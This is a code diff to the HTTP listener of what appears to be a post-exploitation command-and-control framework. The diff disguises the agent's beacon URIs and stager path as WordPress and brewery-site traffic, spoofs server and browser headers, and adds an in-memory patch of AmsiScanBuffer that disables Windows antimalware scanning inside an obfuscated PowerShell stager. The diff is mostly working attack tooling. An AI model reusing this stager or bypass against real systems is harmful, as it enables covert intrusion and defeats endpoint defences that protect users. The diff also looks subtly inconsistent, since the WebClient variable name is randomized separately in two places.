@@ -90,7 +90,7 @@ class Listener:
             'DefaultProfile' : {
                 'Description'   :   'Default communication profile for the agent.',
                 'Required'      :   True,
-                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+                'Value'         :   "/blog/,/wp-admin/login/,/brewery/,/shop?q=2341fdsar3qqa,/wp-content/plugins/square-sync/square-sync.css?ver=0.1,/wp-content/plugins/master-slider/public/assets/css/masterslider.main.css?ver=3.5.3|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8|Accept-Language:en-US,en;q=0.5|Accept-Encoding:gzip, deflate"
             },
             'CertPath' : {
                 'Description'   :   'Certificate path for https listeners.',
@@ -110,7 +110,7 @@ class Listener:
             'Headers' : {
                 'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
-                'Value'         :   'Server:Microsoft-IIS/7.5'
+                'Value'         :   'Server:Microsoft-IIS/10'
             },
             'Cookie' : {
                 'Description'   :   'Custom Cookie Name',
@@ -120,7 +120,7 @@ class Listener:
             'StagerURI' : {
                 'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
                 'Required'      :   False,
-                'Value'         :   ''
+                'Value'         :   '/download/wp-content/uploads/brewery.svg'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -320,18 +320,24 @@ class Listener:
                     stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}};")
 
-                    # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(');$Ref.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true);")
-                    stager += "};"
-                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
+                    # AMSI bypass
+                    stager += '$code = @"\n'
+                    stager += 'using System;using System.Runtime.InteropServices;namespace Bypass{'
+                    stager += 'public class ABP{[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);'
+                    stager += '[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("kernel32")]'
+                    stager += 'public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);'
+                    stager += '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void MoveMemory(IntPtr dest, IntPtr src, int size);'
+                    stager += 'public static int BP(){IntPtr TargetDLL = LoadLibrary("ams"+"i.dll");'
+                    stager += 'IntPtr A = GetProcAddress(TargetDLL, "AmsiS"+"canBuffer");UIntPtr dwSize = (UIntPtr)5;uint Zero = 0;'
+                    stager += 'VirtualProtect(A, dwSize, 0x40, out Zero);Byte[] Patch = { 0x31, 0xff, 0x90 };'
+                    stager += 'IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);Marshal.Copy(Patch, 0, unmanagedPointer, 3);'
+                    stager += 'MoveMemory(A + 0x001b, unmanagedPointer, 3);return 0;}}}\n'
+                    stager += '"@\n;add-type -typedefinition $code;[Bypass.ABP]::BP();'
 
-                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")
+                stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
+                stager += helpers.randomize_capitalization("$" + helpers.generate_random_script_var_name("wc") + "= New-Object System.Net.WebClient;")
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
@@ -343,7 +349,7 @@ class Listener:
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 if userAgent.lower() != 'none':
-                    stager += helpers.randomize_capitalization('$wc.Headers.Add(')
+                    stager += helpers.randomize_capitalization('$' + helpers.generate_random_script_var_name("wc") + '.Headers.Add(')
                     stager += "'User-Agent',$u);"
 
                     if userAgent.lower() != 'none':
